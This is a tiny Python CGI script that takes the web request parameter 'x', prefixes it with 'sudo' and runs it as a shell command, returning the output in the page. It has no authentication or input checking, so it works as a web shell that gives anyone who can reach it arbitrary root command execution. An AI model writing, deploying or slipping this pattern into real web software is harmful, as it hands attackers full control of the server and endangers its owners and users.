#!/usr/bin/python3

import cgi

print("content-type: text/html")
print()

form =  cgi.FieldStorage()
cmd = form.getvalue("x")

print(cmd)

import subprocess
x = subprocess.getoutput("sudo"+" "+cmd)
print(x)
